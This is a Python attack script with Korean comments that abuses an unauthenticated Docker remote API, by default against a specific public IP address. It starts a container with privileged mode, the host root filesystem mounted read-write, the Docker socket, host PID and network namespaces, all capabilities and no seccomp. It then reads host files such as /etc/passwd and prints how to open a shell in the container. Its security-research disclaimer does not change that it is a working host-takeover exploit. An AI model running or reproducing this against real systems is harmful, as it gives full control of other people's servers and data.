import requests
import json
import time
import argparse
from datetime import datetime


class PrivilegedContainerCreator:
    def __init__(self, docker_host, port=2375):
        self.docker_host = docker_host
        self.port = port
        self.base_url = f"http://{docker_host}:{port}"
        self.session = requests.Session()
        self.session.timeout = 10

    def check_docker_api(self):
        """Docker API 접근 확인"""
        try:
            response = self.session.get(f"{self.base_url}/version")
            if response.status_code == 200:
                version_data = response.json()
                print(f"✓ Docker API 접근 성공")
                print(f"  Docker 버전: {version_data.get('Version', 'Unknown')}")
                print(f"  API 버전: {version_data.get('ApiVersion', 'Unknown')}")
                print(f"  OS: {version_data.get('Os', 'Unknown')}")
                print(f"  아키텍처: {version_data.get('Arch', 'Unknown')}")
                return True
            else:
                print(f"✗ Docker API 접근 실패: {response.status_code}")
                return False
        except Exception as e:
            print(f"✗ Docker API 접근 실패: {str(e)}")
            return False

    def list_existing_containers(self):
        """기존 컨테이너 목록 확인"""
        try:
            response = self.session.get(f"{self.base_url}/containers/json?all=true")
            if response.status_code == 200:
                containers = response.json()
                print(f"\n=== 기존 컨테이너 ({len(containers)}개) ===")
                for container in containers:
                    names = container.get('Names', ['Unknown'])
                    image = container.get('Image', 'Unknown')
                    status = container.get('Status', 'Unknown')
                    print(f"  {names[0]}: {image} - {status}")
                return containers
            return []
        except Exception as e:
            print(f"컨테이너 목록 조회 실패: {str(e)}")
            return []

    def pull_image(self, image="alpine:latest"):
        """이미지 다운로드"""
        print(f"\n=== 이미지 다운로드: {image} ===")
        try:
            response = self.session.post(f"{self.base_url}/images/create?fromImage={image}")
            if response.status_code == 200:
                print(f"✓ 이미지 다운로드 성공: {image}")
                return True
            else:
                print(f"이미지 다운로드 실패: {response.status_code}")
                return False
        except Exception as e:
            print(f"이미지 다운로드 실패: {str(e)}")
            return False

    def create_privileged_container(self, container_name="security-test-container"):
        """특권 컨테이너 생성"""
        print(f"\n=== 특권 컨테이너 생성: {container_name} ===")

        # 컨테이너 구성
        container_config = {
            "Image": "alpine:latest",
            "Cmd": [
                "/bin/sh",
                "-c",
                "echo 'Privileged container started' && "
                "echo 'Host info:' && "
                "uname -a && "
                "echo 'Mounted filesystems:' && "
                "df -h && "
                "echo 'Network interfaces:' && "
                "ip addr show && "
                "echo 'Container running...' && "
                "tail -f /dev/null"
            ],
            "Env": [
                "CONTAINER_TYPE=privileged_test",
                "CREATED_BY=security_researcher"
            ],
            "WorkingDir": "/",
            "HostConfig": {
                "Privileged": True,  # 특권 모드
                "NetworkMode": "host",  # 호스트 네트워크
                "PidMode": "host",  # 호스트 PID 네임스페이스
                "Binds": [
                    "/:/host:rw",  # 호스트 루트 파일시스템 마운트
                    "/var/run/docker.sock:/var/run/docker.sock:rw",  # Docker 소켓
                    "/proc:/host/proc:rw",  # 호스트 proc 마운트
                    "/sys:/host/sys:rw"  # 호스트 sys 마운트
                ],
                "CapAdd": ["ALL"],  # 모든 권한 추가
                "SecurityOpt": ["seccomp:unconfined"]  # seccomp 비활성화
            }
        }

        try:
            # 컨테이너 생성
            response = self.session.post(
                f"{self.base_url}/containers/create?name={container_name}",
                json=container_config,
                headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 201:
                container_data = response.json()
                container_id = container_data.get('Id')
                print(f"✓ 특권 컨테이너 생성 성공")
                print(f"  컨테이너 ID: {container_id[:12]}")
                print(f"  컨테이너 이름: {container_name}")

                # 컨테이너 시작
                start_response = self.session.post(f"{self.base_url}/containers/{container_id}/start")
                if start_response.status_code == 204:
                    print(f"✓ 컨테이너 시작 성공")
                    return container_id
                else:
                    print(f"✗ 컨테이너 시작 실패: {start_response.status_code}")

            else:
                print(f"✗ 컨테이너 생성 실패: {response.status_code}")
                if response.text:
                    print(f"  오류 내용: {response.text}")

        except Exception as e:
            print(f"✗ 컨테이너 생성 실패: {str(e)}")

        return None

    def execute_commands(self, container_id):
        """컨테이너에서 명령 실행"""
        print(f"\n=== 시스템 정보 수집 ===")

        commands = [
            ("호스트 정보", "uname -a"),
            ("사용자 목록", "cat /host/etc/passwd | head -10"),
            ("실행 중인 프로세스", "ps aux | head -20"),
            ("네트워크 연결", "netstat -tuln | head -10"),
            ("디스크 사용량", "df -h"),
            ("메모리 정보", "cat /host/proc/meminfo | head -10"),
            ("Docker 프로세스", "ps aux | grep docker"),
            ("호스트 파일 시스템", "ls -la /host/"),
        ]

        for desc, cmd in commands:
            print(f"\n--- {desc} ---")
            self._exec_command(container_id, cmd)

    def _exec_command(self, container_id, command):
        """개별 명령 실행"""
        try:
            # exec 생성
            exec_config = {
                "AttachStdout": True,
                "AttachStderr": True,
                "Cmd": ["/bin/sh", "-c", command]
            }

            exec_response = self.session.post(
                f"{self.base_url}/containers/{container_id}/exec",
                json=exec_config,
                headers={'Content-Type': 'application/json'}
            )

            if exec_response.status_code == 201:
                exec_id = exec_response.json().get('Id')

                # exec 시작
                start_response = self.session.post(
                    f"{self.base_url}/exec/{exec_id}/start",
                    json={"Detach": False, "Tty": False},
                    headers={'Content-Type': 'application/json'}
                )

                if start_response.status_code == 200:
                    output = start_response.text.strip()
                    if output:
                        print(output)
                    else:
                        print("(출력 없음)")
                else:
                    print(f"명령 실행 실패: {start_response.status_code}")

        except Exception as e:
            print(f"명령 실행 오류: {str(e)}")

    def generate_report(self, container_id, container_name):
        """보고서 생성"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        report = f"""# Docker API 특권 컨테이너 생성 보고서

## 기본 정보
- 대상 호스트: {self.docker_host}:{self.port}
- 생성 시간: {timestamp}
- 컨테이너 ID: {container_id[:12] if container_id else 'N/A'}
- 컨테이너 이름: {container_name}

## 생성된 컨테이너 권한
- Privileged Mode: 활성화
- Host Network: 사용
- Host PID Namespace: 사용
- Host Filesystem Mount: / -> /host (rw)
- Docker Socket Mount: 활성화
- All Capabilities: 추가됨
- Seccomp: 비활성화

## 보안 영향도
- 호스트 시스템 완전 접근 가능
- 다른 컨테이너 제어 가능
- 네트워크 트래픽 모니터링 가능
- 시스템 설정 변경 가능

## 권고사항
1. Docker API 외부 노출 금지
2. TLS 인증 설정 필수
3. 방화벽 규칙 설정
4. 정기적인 보안 감사

## 면책 조항
이 테스트는 보안 연구 목적으로 수행되었습니다.
"""

        filename = f"privileged_container_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)

        print(f"\n보고서 생성: {filename}")
        return filename


def main():
    parser = argparse.ArgumentParser(description='Create Privileged Container via Docker API')
    parser.add_argument('--host', default='43.202.78.16', help='Docker host IP')
    parser.add_argument('--port', type=int, default=2375, help='Docker API port')
    parser.add_argument('--name', default='security-test-container', help='Container name')
    parser.add_argument('--no-exec', action='store_true', help='Skip command execution')

    args = parser.parse_args()

    print("Docker API 특권 컨테이너 생성 도구")
    print("=" * 50)
    print(f"대상: {args.host}:{args.port}")
    print("경고: 이 도구는 보안 테스트 목적으로만 사용하세요!")

    # 사용자 확인
    confirm = input("\n계속 진행하시겠습니까? (yes/no): ")
    if confirm.lower() != 'yes':
        print("작업이 취소되었습니다.")
        return

    # 컨테이너 생성 실행
    creator = PrivilegedContainerCreator(args.host, args.port)

    # 1. Docker API 확인
    if not creator.check_docker_api():
        print("Docker API에 접근할 수 없습니다.")
        return

    # 2. 기존 컨테이너 확인
    creator.list_existing_containers()

    # 3. 이미지 다운로드
    creator.pull_image()

    # 4. 특권 컨테이너 생성
    container_id = creator.create_privileged_container(args.name)

    if container_id:
        print(f"\n✓ 특권 컨테이너 생성 완료!")
        print(f"  컨테이너 ID: {container_id[:12]}")

        # 5. 명령 실행 (옵션)
        if not args.no_exec:
            time.sleep(2)  # 컨테이너 시작 대기
            creator.execute_commands(container_id)

        # 6. 보고서 생성
        creator.generate_report(container_id, args.name)

        print(f"\n컨테이너 접근 방법:")
        print(f"docker -H {args.host}:{args.port} exec -it {args.name} /bin/sh")
    else:
        print("\n✗ 특권 컨테이너 생성 실패")


if __name__ == "__main__":
    main()